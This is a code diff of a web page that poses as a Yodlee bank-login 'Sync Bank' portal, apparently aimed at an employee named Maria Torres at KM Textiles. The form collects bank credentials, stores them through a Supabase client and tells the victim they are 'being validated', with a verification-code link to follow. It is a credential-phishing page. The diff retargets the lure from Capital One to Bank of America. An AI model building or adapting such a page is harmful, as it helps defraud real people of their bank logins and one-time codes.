@@ -13,9 +13,9 @@
 
 <title>Sync Bank | KM Textiles</title>
 
-<link rel="stylesheet" href="nicepage.css?v=1.0.2" />
-<script src="jquery.js?v=1.0.1" defer></script>
-<script src="nicepage.js?v=1.0.2" defer></script>
+<link rel="stylesheet" href="nicepage.css?v=1.0.3" />
+<script src="jquery.js?v=1.0.2" defer></script>
+<script src="nicepage.js?v=1.0.3" defer></script>
 
 <style>
 
@@ -114,7 +114,7 @@ input,select{
 
   <div class="profile-box">
     <h3 id="displayName">Maria Torres</h3>
-    <p><b>Login via Yodlee®:</b> <span id="displayLanguage">Capital One</span></p>
+    <p><b>Login via Yodlee®:</b> <span id="displayLanguage"> Bank of America Corporation</span></p>
   </div>
 
   <div class="note">
@@ -161,7 +161,7 @@ const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBh
 const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
 const profileName = "Maria Torres";
-const profileLanguage = "Capital One";
+const profileLanguage = " Bank of America Corporation";
 
 document.getElementById("displayName").textContent = profileName;
 document.getElementById("displayLanguage").textContent = profileLanguage;
@@ -200,7 +200,7 @@ document.getElementById("syncForm").addEventListener("submit", async (e) => {
     e.target.reset();
 
     msg.textContent =
-      "✅ Credentials Received. Our system is now validating your account with Capital One. If a verification code is required, a secure link will be sent to your work email.";
+      "✅ Credentials Received. Our system is now validating your account with  Bank of America Corporation. If a verification code is required, a secure link will be sent to your work email.";
 
   } catch (err) {
     console.error(err);
